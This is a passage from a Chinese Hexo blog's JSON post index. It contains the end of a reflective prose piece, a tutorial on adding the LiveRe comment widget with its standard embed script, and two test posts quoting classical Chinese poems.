\n\n​\t十年后，她已经是企业里的第二把手，深得老板器重。谁也想不到十年前的她不过是一个刚从乡下出来的农村女孩。现在的她有着高收入，有车有房，但是她并不快乐。因为五年前她在乡下的父母去世了，邻居联络不到她。直到两年前她事业有成之后回乡接父母才知道这件事。在乡下，待在没有父母的家里时，衣着光鲜的她和周围的环境格格不入。所以她很快回到了城市，重新投入工作，却越来越空虚。因为她这十年来所付出的一切都是为了父母，如今父母不在了，她也失去了快乐。    \n\n​\t 她原以为十年的时间能够让她彻底变成一个城市人，但是她没有想到她十年后依然是异乡的陌生人，无法和父母一起在城市有一个家，依旧孤零零地在城市里寂寞着。","tags":["情怀"],"categories":["日记"]},{"title":"[post]hexo主题添加评论功能","url":"/2018/05/01/hexo主题添加评论功能/","content":"\n前言：本文简要介绍livere评论系统的的添加，如您想要添加其他评论系统，请拉至文末，阅读相关博文（或者查阅更多资料）\n\n<!--more-->\n\n# 一、注册评论系统\n\n动手前请阅读网友博客：<a href=\"https://blog.csdn.net/ganzhilin520/article/details/79048010\">传送门</a>\n\n# 二、修改相关文件\n\n1、修改配置文件 D:\\hexo\\themes\\indigoCard\\\\_config.yml，添加如下代码：\n\n```yml\n#来必力评论系统\nlivere_uid: true\n```\n\n2、修改脚本文件 D:\\hexo\\themes\\indigoCard\\layout\\_partial\\post\\\\comment.ejs，添加如下代码：\n\n```ejs\n<%- partial('../plugins/livere') %>\n```\n\n3、添加脚本文件 D:\\hexo\\themes\\indigoCard\\layout\\_partial\\plugins\\\\livere.ejs，代码如下：\n\n```html\n<!-- livere BEGIN -->\n\n<div id=\"lv-container\" data-id=\"city\" data-uid=\"MTAyMC8zNjE0Mi8xMjY3Nw==\">\n\t<script type=\"text/javascript\">\n   (function(d, s) {\n       var j, e = d.getElementsByTagName(s)[0];\n\n       if (typeof LivereTower === 'function') { return; }\n\n       j = d.createElement(s);\n       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';\n       j.async = true;\n\n       e.parentNode.insertBefore(j, e);\n   })(document, 'script');\n\t</script>\n<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>\n</div>\n\n<!-- livere END -->\n```\n\n简单而言，其中代码来自于官方网站。\n\n# 三、重新部署\n\n```npm\nhexo generate\nhexo deploy\n```\n\n# 四、其他相关博文\n\n添加Valine评论系统  <a href=\"https://www.xxwhite.com/2017/Valine.html\">传送门</a>\n\n其他评论系统介绍 <a href=\"https://blog.csdn.net/xiangzhihong8/article/details/77703791\">传送门</a>","categories":["建站笔记"]},{"title":"[post]中文测试一","url":"/2018/04/30/中文测试一/","content":"\n# \t题都城南庄\n\n​\t崔护\n\n​\t去年今日此门中，人面桃花相映红。\n\n​\t人面不知何处去，桃花依旧笑春风。\n\n","tags":["崔护诗选"],"categories":["唐诗选抄"]},{"title":"[post]中文测试二","url":"/2018/04/30/中文测试二/","content":"\n# \t木兰花\n\n​\t纳兰性德\n\n​\t人生若只如初见，何事秋风悲画扇。\n\n​\t等闲变却故人心，却道古人心易变。\n\n​\t骊山语罢清宵半，泪雨霖铃终不怨。\n\n​\t何如薄幸锦衣郎，比翼连枝当日愿。\n\n\n\n","tags":["纳兰性德"],"categories":["宋词选抄"]}]